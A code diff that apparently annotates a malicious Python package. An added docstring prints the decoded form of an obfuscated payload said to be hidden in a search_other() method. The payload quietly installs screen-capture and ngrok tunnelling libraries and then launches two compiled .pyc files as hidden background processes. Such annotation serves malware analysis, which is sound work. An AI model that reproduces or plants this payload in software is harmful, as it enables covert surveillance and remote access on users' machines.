@@ -1,3 +1,32 @@
+"""
+The search_other() method contains obfuscated payload.
+The original payload looks as follows:
+
+subprocess.check_call(
+    [
+        sys.executable,
+        "-m",
+        "pip",
+        "install",
+        "--quiet",
+        "requests",
+        "psutil",
+        "flask",
+        "mss",
+        "pyngrok",
+    ]
+)
+subprocess.Popen(
+    "(nohup python pkg_search/search_misc.pyc </dev/null >/dev/null 2>&1 &)",
+    shell=True,
+)
+time.sleep(5)
+subprocess.Popen(
+    "(nohup python pkg_search/search_index.pyc </dev/null >/dev/null 2>&1 &)",
+    shell=True,
+)
+"""
+
 import requests, os, sys, subprocess, time
 from bs4 import BeautifulSoup
 import base64
